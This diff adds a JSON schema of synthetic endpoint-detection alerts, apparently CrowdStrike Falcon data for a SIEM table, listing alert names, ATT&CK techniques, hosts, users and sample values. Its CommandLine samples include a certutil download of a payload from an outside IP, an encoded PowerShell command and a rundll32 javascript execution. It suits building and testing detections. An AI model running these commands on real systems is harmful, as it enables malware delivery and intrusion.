@@ -1,0 +1,96 @@
+{
+  "columns": [
+    { "name": "TimeGenerated", "type": "datetime" },
+    { "name": "AlertId", "type": "string" },
+    { "name": "AlertName", "type": "string", "values": [
+      "Suspicious PowerShell Execution",
+      "Credential Theft Detected",
+      "Ransomware Behavior Detected",
+      "Malicious Document Execution",
+      "Process Injection Detected",
+      "Cobalt Strike Activity",
+      "Living Off the Land Binary Usage",
+      "Persistence Mechanism Created",
+      "Lateral Movement Detected",
+      "Defense Evasion Technique"
+    ] },
+    { "name": "AlertDescription", "type": "string", "values": [
+      "PowerShell executed with encoded command and hidden window flags.",
+      "Credential dumping activity was detected targeting LSASS process memory.",
+      "Ransomware-like file encryption behavior was observed on the endpoint.",
+      "A macro-enabled document attempted to spawn a child process.",
+      "Process injection into a legitimate system binary was detected.",
+      "Cobalt Strike beacon signature identified in network traffic.",
+      "Use of LOLBin certutil.exe for downloading remote payloads.",
+      "A new scheduled task or registry run key was created for persistence.",
+      "Credential-based lateral movement via SMB or WMI was detected.",
+      "Attempt to disable Windows Defender or tamper with event logs."
+    ] },
+    { "name": "Severity", "type": "string", "values": ["Critical", "High", "Medium", "Low", "Informational"] },
+    { "name": "Confidence", "type": "int", "values": [100, 95, 90, 85, 80, 70, 60, 50] },
+    { "name": "Tactic", "type": "string", "values": [
+      "Execution",
+      "Credential Access",
+      "Impact",
+      "Initial Access",
+      "Defense Evasion",
+      "Persistence",
+      "Lateral Movement",
+      "Command and Control",
+      "Privilege Escalation",
+      "Discovery"
+    ] },
+    { "name": "Technique", "type": "string", "values": [
+      "PowerShell (T1059.001)",
+      "OS Credential Dumping (T1003)",
+      "Data Encrypted for Impact (T1486)",
+      "Phishing: Spearphishing Attachment (T1566.001)",
+      "Process Injection (T1055)",
+      "Ingress Tool Transfer (T1105)",
+      "Signed Binary Proxy Execution (T1218)",
+      "Scheduled Task/Job (T1053)",
+      "Remote Services: SMB (T1021.002)",
+      "Impair Defenses (T1562)"
+    ] },
+    { "name": "DeviceId", "type": "string" },
+    { "name": "ComputerName", "type": "string", "values": ["WS-PC01", "SRV-DC01", "SRV-WEB01", "LNX-APP01"] },
+    { "name": "UserName", "type": "string", "values": ["jsmith", "agarcia", "mwilson", "lchen", "pjones", "admin"] },
+    { "name": "FileName", "type": "string", "values": [
+      "powershell.exe", "cmd.exe", "rundll32.exe", "mimikatz.exe",
+      "certutil.exe", "mshta.exe", "wscript.exe", "regsvr32.exe"
+    ] },
+    { "name": "FilePath", "type": "string", "values": [
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\powershell.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe",
+      "\\Device\\HarddiskVolume3\\Users\\jsmith\\Downloads\\mimikatz.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\Temp\\payload.exe"
+    ] },
+    { "name": "CommandLine", "type": "string", "values": [
+      "powershell.exe -EncodedCommand SQBFAFgA...",
+      "cmd.exe /c whoami /priv",
+      "certutil.exe -urlcache -split -f http://203.0.113.42/payload.exe",
+      "rundll32.exe javascript:\"\\..\\mshtml\""
+    ] },
+    { "name": "SHA256", "type": "string", "values": [
+      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
+    ] },
+    { "name": "LocalIP", "type": "string", "values": ["10.0.1.50", "10.0.1.51", "10.0.2.10"] },
+    { "name": "ExternalIP", "type": "string", "values": ["203.0.113.42", "198.51.100.17"] },
+    { "name": "OSVersion", "type": "string", "values": ["Windows 10", "Windows 11", "Windows Server 2019", "Windows Server 2022"] },
+    { "name": "AgentVersion", "type": "string", "values": ["7.10.16303.0", "7.09.16205.0", "7.08.16103.0"] },
+    { "name": "SensorAction", "type": "string", "values": ["none", "monitored", "blocked", "killed"] },
+    { "name": "Status", "type": "string", "values": ["new", "in_progress", "closed", "reopened", "ignored"] },
+    { "name": "FalconHostLink", "type": "string", "values": [
+      "https://falcon.crowdstrike.com/alerts/detail/abc123",
+      "https://falcon.crowdstrike.com/alerts/detail/def456"
+    ] },
+    { "name": "Tags", "type": "dynamic", "values": [
+      ["SensorGroupingTags/Production", "FalconGroupingTags/Critical"],
+      ["SensorGroupingTags/Development"],
+      ["FalconGroupingTags/HighValue", "SensorGroupingTags/DMZ"],
+      []
+    ] },
+    { "name": "SourceSystem", "type": "string", "values": ["RestAPI"] }
+  ]
+}
